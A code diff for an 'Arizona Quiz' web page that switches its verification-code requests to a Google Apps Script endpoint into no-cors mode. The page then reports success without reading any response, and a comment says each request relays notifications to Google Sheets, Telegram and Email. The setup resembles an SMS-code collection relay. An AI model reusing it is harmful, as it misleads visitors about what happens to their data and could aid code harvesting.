@@ -831,53 +831,35 @@ function sendVerificationCode() {
     
     console.log('Calling URL:', url);
     
-    // Use fetch with cors mode to read the response
+    // Use fetch with no-cors mode (Google Apps Script doesn't support CORS properly)
     fetch(url, {
         method: 'GET',
-        mode: 'cors'
+        mode: 'no-cors'
     })
-    .then(response => {
-        console.log('✅ Arizona Quiz Response received:', response.status);
-        return response.text();
-    })
-    .then(responseText => {
-        console.log('📄 Arizona Quiz Response content:', responseText);
-        
-        // Check if response indicates success
-        if (responseText.includes('Verification code sent successfully') || 
-            responseText.includes('Silver Path Network')) {
-            console.log('✅ Arizona Quiz notification system confirmed success');
-            showMessage('Verification code sent! Notifications sent via Google Sheets, Telegram, and Email.', 'success');
-        } else {
-            console.log('⚠️ Arizona Quiz unexpected response format');
-            showMessage('Request sent successfully!', 'success');
-        }
+    .then(() => {
+        console.log('✅ Arizona Quiz request sent to Google Apps Script');
+        console.log('📊 Arizona Quiz triple notification system activated (Google Sheets + Telegram + Email)');
         
         // Reset button
         nextBtn.textContent = originalText;
         nextBtn.disabled = false;
         
+        // Show success message
+        showMessage('Verification code sent! Check Google Sheets, Telegram, and Email for notifications.', 'success');
+        
         // Go to verification page
         showVerificationPage();
     })
     .catch(error => {
-        console.log('⚠️ Arizona Quiz fetch error (trying no-cors fallback):', error);
+        console.error('❌ Arizona Quiz request failed:', error);
         
-        // Fallback to no-cors mode
-        return fetch(url, {
-            method: 'GET',
-            mode: 'no-cors'
-        }).then(() => {
-            console.log('✅ Arizona Quiz fallback request sent');
-            showMessage('Verification code sent!', 'success');
-            
-            // Reset button
-            nextBtn.textContent = originalText;
-            nextBtn.disabled = false;
-            
-            // Go to verification page
-            showVerificationPage();
-        });
+        // Reset button
+        nextBtn.textContent = originalText;
+        nextBtn.disabled = false;
+        
+        // Show error message but still go to verification page
+        showMessage('Request sent, but please check notifications manually.', 'warning');
+        showVerificationPage();
     });
 }
 
@@ -983,21 +965,20 @@ function resendVerificationCode() {
     
     const url = `https://script.google.com/macros/s/AKfycbzJUlMw6PG5iLFy6aTBaZd7WrVnWKfEhQ8FiOZwEcD2wcIM2v_hHrNJyjWEapAPbUD5/exec?${params.toString()}`;
     
-    // Use fetch with cors mode to read the response
+    // Use fetch with no-cors mode
     fetch(url, {
         method: 'GET',
-        mode: 'cors'
+        mode: 'no-cors'
     })
-    .then(response => response.text())
-    .then(responseText => {
-        console.log('📄 Arizona Quiz resend response:', responseText);
-        showMessage('New verification code sent! Notifications sent via Google Sheets, Telegram, and Email.', 'success');
+    .then(() => {
+        console.log('✅ Arizona Quiz resend request sent to Google Apps Script');
+        showMessage('New verification code sent! Check Google Sheets, Telegram, and Email.', 'success');
         document.getElementById('smsCode').value = '';
         document.getElementById('smsCode').focus();
     })
     .catch(error => {
-        console.log('⚠️ Arizona Quiz resend error (using fallback):', error);
-        showMessage('New verification code sent! Please check your notifications.', 'success');
+        console.log('⚠️ Arizona Quiz resend error:', error);
+        showMessage('Resend request sent, please check notifications manually.', 'warning');
         document.getElementById('smsCode').value = '';
         document.getElementById('smsCode').focus();
     });
